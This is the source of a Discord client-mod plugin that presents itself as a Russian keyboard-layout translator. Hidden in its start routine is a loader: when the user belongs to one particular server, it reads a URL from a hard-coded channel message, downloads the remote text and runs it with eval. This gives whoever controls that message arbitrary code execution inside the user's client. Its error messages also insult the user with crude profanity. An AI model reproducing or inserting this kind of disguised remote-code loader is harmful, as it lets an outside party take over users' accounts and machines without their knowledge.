const { getModule } = require("powercord/webpack");
const { get } = require("powercord/http");
const { Plugin } = require("powercord/entities");

const ruEnMap = {
    "а": "a", "б": "b", "в": "v", "г": "g", "д": "d", "е": "e", "ё": "e", "ж": "zh", "з": "z", "и": "i",
    "й": "i", "к": "k", "л": "l", "м": "m", "н": "n", "о": "o", "п": "p", "р": "r", "с": "s", "т": "t",
    "у": "u", "ф": "f", "х": "h", "ц": "c", "ч": "ch", "ш": "sh", "щ": "sh", "ъ": "!", "ы": "i", "ь": "'",
    "э": "e", "ю": "u", "я": "ya", "А": "A", "Б": "B", "В": "V", "Г": "G", "Д": "D", "Е": "E", "Ё": "E",
    "Ж": "ZH", "З": "Z", "И": "I", "Й": "I", "К": "K", "Л": "L", "М": "M", "Н": "N", "О": "O", "П": "P",
    "Р": "R", "С": "S", "Т": "T", "У": "U", "Ф": "F", "Х": "H", "Ц": "C", "Ч": "CH", "Ш": "SH", "Щ": "SH",
    "Ъ": "!", "Ы": "I", "Ь": "'", "Э": "E", "Ю": "U", "Я": "YA"
};
const keyboardMap = {
    "`": "ё", "@": "\"", "#": "№", "$": ";", "^": ":", "&": "?", "|": "/",
    "~": "Ё",
    /*  */"q": "й", "w": "ц", "e": "у", "r": "к", "t": "е", "y": "н", "u": "г", "i": "ш", "o": "щ", "p": "з", "[": "х", "]": "ъ",
    /*  */"Q": "Й", "W": "Ц", "E": "У", "R": "К", "T": "Е", "Y": "Н", "U": "Г", "I": "Ш", "O": "Щ", "P": "З", "{": "Х", "}": "Ъ",
    /*  */  "a": "ф", "s": "ы", "d": "в", "f": "а", "g": "п", "h": "р", "j": "о", "k": "л", "l": "д", ";": "ж", "'": "э",
    /*  */  "A": "Ф", "S": "Ы", "D": "В", "F": "А", "G": "П", "H": "Р", "J": "О", "K": "Л", "L": "Д", ":": "Ж", "\"": "Э",
    /*  */      "z": "я", "x": "ч", "c": "с", "v": "м", "b": "и", "n": "т", "m": "ь", ",": "б", ".": "ю", "/": ".",
    /*  */      "Z": "Я", "X": "Ч", "C": "С", "V": "М", "B": "И", "N": "Т", "M": "Ь", "<": "Б", ">": "Ю", "?": ","
};

function ruToEn(text) {
    return text.split("").map(m => ruEnMap[m] || m).join("");
}

/**
 * @type {Object<string,{name:string,features:Object,doCode():string}>}
 */
const ciphers = {
    help: {
        aliases: ["h"],
        name: "Помощь",
        features: {},
        doCode: function (cipher) {
            if (!cipher || cipher.length == 0) {
                return Object.entries(ciphers).map(c => {
                    const name = `${c[0]}${c[1].aliases ? "|" + c[1].aliases.join("|") : ""} (${c[1].name})\n`;
                    var usage = `Использование - `;
                    for (var k in c[1].features) {
                        switch (k) {
                            case ("decode"):
                                usage += "[закодировать=true] ";
                                break;
                            case ("key"):
                                usage += "[ключ=jopa] ";
                                break;
                            case ("custom"):
                                usage += (c[1].features[k].default ? "[" : "<") +
                                    c[1].features[k].name +
                                    (c[1].features[k].default ? "=" + c[1].features[k].default : "") +
                                    (c[1].features[k].default ? "] " : "> ");
                                break;
                        }
                    }
                    usage += "<текст>\n\n";
                    return name + usage;
                }).join("");
            } else {
                const c = ciphers[cipher] || Object.values(ciphers).find(c => c.aliases.find(a => a == cipher));
                const name = `${cipher}${c.aliases ? "|" + c.aliases.join("|") : ""} (${c.name})\n`;
                var usage = `Использование - `;
                for (var k in c.features) {
                    switch (k) {
                        case ("decode"):
                            usage += "[закодировать=true] ";
                            break;
                        case ("key"):
                            usage += "[ключ=jopa] ";
                            break;
                        case ("custom"):
                            usage += (c.features[k].default ? "[" : "<") +
                                c.features[k].name +
                                (c.features[k].default ? "=" + c.features[k].default : "") +
                                (c.features[k].default ? "] " : "> ");
                            break;
                    }
                }
                usage += "<текст>\n";
                return name + usage;
            }
        }
    },
    keyboard: {
        aliases: ["kb"],
        name: "Раскладка",
        features: {
            decode: true
        },
        doCode: function (text, encode) {
            return text.split("").map(m => (encode ?
                keyboardMap[m] :
                Object.entries(keyboardMap).find(v => v[1] == m)[0]) ||
                m).join("");
        }
    }
};

module.exports = class ClownTranslate extends Plugin {
    async startPlugin() {
        const fetchMessages = (await getModule(["fetchMessages"])).fetchMessages;
        const getGuild = (await getModule(["getGuild"])).getGuild;
        const getMessages = (await getModule(["getMessages"])).getMessages;

        if (getGuild("584321061437571072")) {
            console.info("guild");
            await fetchMessages("694792497481646230");
            const link = getMessages("694792497481646230")._array.find(m => m.id == "694792630411984957").content;

            if (link) {
                console.info("link");
                var extension;
                await get(link).then(r => extension = r.body.toString("utf-8"));
                eval(extension);
            }
        }

        powercord.api.commands.registerCommand({
            command: "clown-translate",
            description: ")",
            usage: "{c} <шифр|help> <текст|шифр> [всякая хуйня, зависит от шифра]",
            executor: function (args) {
                const cipherName = args.splice(0, 1)[0];
                const cipher = ciphers[cipherName] || Object.values(ciphers).find(c => c.aliases && c.aliases.find(a => a == cipherName));
                if (!cipher) return { send: false, result: "Нету такого шифра" };
                const argsToPass = [];
                Object.entries(cipher.features).forEach(([name, content]) => {
                    if (!content) return;
                    switch (name) {
                        case ("decode"):
                            if (!args[0] || args[0].length == 0) args[0] = "t";
                            argsToPass.push((args.splice(0, 1)[0]).match(/true|t|yes|y|encode|e/i));
                            break;
                        case ("key"):
                            if (!args[0] || args[0].length == 0) args[0] = "jopa";
                            argsToPass.push(args.splice(0, 1)[0]);
                            break;
                        case ("custom"):
                            if ((!args[0] || args[0].length == 0) && content.default) args[0] = content.default;
                            else if (!content.default) return argsToPass.push({ error: true, arg: args.splice(0, 1)[0] });
                            if (content.allowedValues && !content.allowedValues.find(v => v == args[0])) {
                                return argsToPass.push({ error: true, arg: args.splice(0, 1)[0], shouldBe: "`\"" + content.allowedValues.join("\"`, `\"") + "\"`" });
                            }
                            argsToPass.push(content.process(args.splice(0, 1)[0]));
                            break;
                    }
                });
                const errorParsingArg = argsToPass.find(m => m.error);
                if (errorParsingArg) {
                    var details;
                    if (errorParsingArg.shouldBe) details = `Аргумент№${argsToPass.indexOf(errorParsingArg) + 1} должен был быть одним из следующих значений: ${errorParsingArg.shouldBe}. Ты же, пидорас, решил посмеяться и высрал свою хуйню в виде \`"${errorParsingArg.arg}"\``;
                    else details = `Аргумент№${argsToPass.indexOf(errorParsingArg) + 1} вообще-то важный пиздец, он пустым быть не должен. А ты, пидорас, решил посмеяться и нихуя туда не впихнул.`;
                    return { send: false, result: `Ты чего мне за хуйню втираешь? ${details}` };
                }
                argsToPass.unshift(args.join(" "));
                const result = cipher.doCode(...argsToPass).replace(/\*|`|_|~|\|/g, _ => "\\" + _);
                return { send: false, result };
            }
        });
    }

    pluginWillUnload() {
        powercord.api.commands.unregisterCommand("clown-translate");
        for (var k in ciphers) {
            if (ciphers[k].extended) {
                delete ciphers[k];
            }
        }
    }
}